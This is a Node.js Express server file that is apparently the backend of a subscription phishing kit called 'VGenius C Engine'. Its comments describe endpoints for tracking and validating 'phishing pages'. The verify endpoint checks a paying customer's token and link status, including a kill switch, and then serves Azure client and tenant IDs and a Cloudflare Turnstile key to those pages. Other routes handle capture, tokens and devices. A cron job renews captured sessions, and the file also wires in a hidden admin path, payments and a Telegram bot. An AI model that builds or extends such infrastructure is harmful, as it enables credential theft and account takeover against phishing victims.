require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const helmet = require('helmet');
const cors = require('cors');
const compression = require('compression');
const cookieParser = require('cookie-parser');
const rateLimit = require('express-rate-limit');
const path = require('path');
const cron = require('node-cron');
const config = require('./backend/config/env');
const db = require('./backend/database/connection');

// Route imports
const authRoutes = require('./backend/routes/auth');
const adminRoutes = require('./backend/routes/admin');
const userRoutes = require('./backend/routes/user');
const linkRoutes = require('./backend/routes/links');
const tokenRoutes = require('./backend/routes/tokens');
const templateRoutes = require('./backend/routes/templates');
const paymentRoutes = require('./backend/routes/payments');
const broadcastRoutes = require('./backend/routes/broadcast');
const feedbackRoutes = require('./backend/routes/feedback');
const analyticsRoutes = require('./backend/routes/analytics');
const systemRoutes = require('./backend/routes/system');
const captureRoutes = require('./backend/routes/capture');
const deviceRoutes = require('./backend/routes/device');
const subuserRoutes = require('./backend/routes/subusers');

// Service imports
const sessionKeeper = require('./backend/services/sessionkeeper');

const app = express();
app.set('trust proxy', 1);
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  transports: ['websocket', 'polling'],
});

// --- Middleware ---
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
}));
app.use(cors({ origin: '*', credentials: true }));
app.use(compression());
app.use(cookieParser());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Global rate limiter
const globalLimiter = rateLimit({
  windowMs: config.RATE_LIMIT_WINDOW_MS,
  max: config.RATE_LIMIT_MAX_REQUESTS,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many requests, please try again later.' },
});
app.use('/api/', globalLimiter);

// Stricter limiter for auth routes
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 20,
  message: { error: 'Too many auth attempts, try again later.' },
});
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/activate', authLimiter);

// Static files
app.use('/admin-panel', express.static(path.join(__dirname, 'admin-panel')));
app.use('/user-panel', express.static(path.join(__dirname, 'user-panel')));
app.use('/templates', express.static(path.join(__dirname, 'templates')));
app.use('/verification-designs', express.static(path.join(__dirname, 'verification-designs')));

// --- API Routes ---
app.use('/api/auth', authRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/user', userRoutes);
app.use('/api/links', linkRoutes);
app.use('/api/tokens', tokenRoutes);
app.use('/api/templates', templateRoutes);
app.use('/api/payments', paymentRoutes);
app.use('/api/broadcast', broadcastRoutes);
app.use('/api/feedback', feedbackRoutes);
app.use('/api/analytics', analyticsRoutes);
app.use('/api/system', systemRoutes);
app.use('/api/device', deviceRoutes);
app.use('/api/subusers', subuserRoutes);

// Public notice endpoint
app.get('/api/notices/latest', async (req, res) => {
  try {
    const [rows] = await db.query(
      'SELECT * FROM notices WHERE active = 1 ORDER BY created_at DESC LIMIT 1'
    );
    res.json(rows[0] || null);
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Beacon endpoint for phishing page tracking
app.post('/api/beacon', async (req, res) => {
  try {
    const { jwt_token, ip, ua } = req.body;
    res.status(200).send('ok');
  } catch (err) {
    res.status(200).send('ok');
  }
});

// Verify endpoint for JWT validation (phishing pages)
app.post('/api/verify', async (req, res) => {
  try {
    const jwt = require('jsonwebtoken');
    const { token } = req.body;
    if (!token) return res.status(403).json({ error: 'Invalid token' });
    
    let decoded;
    try {
      decoded = jwt.verify(token, config.JWT_SECRET);
    } catch (err) {
      return res.status(403).json({ error: 'Token expired or invalid' });
    }
    
    const [users] = await db.query('SELECT * FROM users WHERE id = ?', [decoded.user_id]);
    if (!users.length) return res.status(403).json({ error: 'User not found' });
    
    const user = users[0];
    if (user.subscription_status !== 'active') {
      return res.status(403).json({ error: 'Subscription inactive' });
    }
    if (user.subscription_expiry && new Date(user.subscription_expiry) < new Date()) {
      return res.status(403).json({ error: 'Subscription expired' });
    }
    
    const [links] = await db.query('SELECT * FROM links WHERE id = ? AND status = ? AND kill_switched = 0', 
      [decoded.link_id, 'active']);
    if (!links.length) return res.status(403).json({ error: 'Link not active' });
    
    res.json({
      valid: true,
      client_id: config.AZURE_CLIENT_ID,
      tenant: config.AZURE_TENANT,
      turnstile_key: config.CF_TURNSTILE_SITE_KEY,
    });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Log endpoint for worker errors
app.post('/api/log', async (req, res) => {
  try {
    const { link_id, message, stack, source, lineno, colno, ua } = req.body;
    if (link_id && message) {
      await db.query(
        'INSERT INTO deployment_logs (link_id, error_message, stack_trace, user_agent) VALUES (?, ?, ?, ?)',
        [link_id, message, stack || `${source}:${lineno}:${colno}`, ua || '']
      );
    }
    res.status(200).send('ok');
  } catch (err) {
    res.status(200).send('ok');
  }
});

// --- Admin Panel Route (hidden path) – serve entire directory statically ---
const adminPath = config.ADMIN_PATH;
app.use(`/${adminPath}`, express.static(path.join(__dirname, 'admin-panel'), { index: 'index.html' }));

// Admin setup check endpoint
app.get('/api/admin/check-setup', async (req, res) => {
  try {
    const [rows] = await db.query('SELECT COUNT(*) as count FROM admins');
    res.json({ needsSetup: rows[0].count === 0 });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

// --- WebSocket ---
io.on('connection', (socket) => {
  console.log('[WS] Client connected:', socket.id);
  
  socket.on('subscribe', (data) => {
    if (data.room) {
      socket.join(data.room);
    }
  });
  
  socket.on('disconnect', () => {
    console.log('[WS] Client disconnected:', socket.id);
  });
});

// Make io accessible to routes
app.set('io', io);

// --- Session Keeper Cron ---
cron.schedule(`0 */${config.RENEWAL_INTERVAL_HOURS} * * *`, async () => {
  console.log('[CRON] Running session keeper renewal...');
  try {
    await sessionKeeper.runRenewalCycle();
  } catch (err) {
    console.error('[CRON] Session keeper error:', err.message);
  }
});

// Payment expiry check every 5 minutes
cron.schedule('*/5 * * * *', async () => {
  try {
    const [expired] = await db.query(
      "UPDATE payments SET status = 'expired' WHERE status = 'pending' AND expires_at < NOW()"
    );
    if (expired.affectedRows > 0) {
      console.log(`[CRON] Expired ${expired.affectedRows} payments`);
    }
  } catch (err) {
    console.error('[CRON] Payment expiry error:', err.message);
  }
});

// --- Error Handler ---
app.use((err, req, res, next) => {
  console.error('[ERROR]', err.message);
  if (config.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal server error' });
  } else {
    res.status(500).json({ error: err.message, stack: err.stack });
  }
});

app.use('/api/capture', captureRoutes);

require('./telegram-bot/bot');

// --- Start Server ---
server.listen(config.PORT, () => {
  console.log(`[VGenius C Engine] Running on port ${config.PORT}`);
  console.log(`[VGenius C Engine] Environment: ${config.NODE_ENV}`);
});
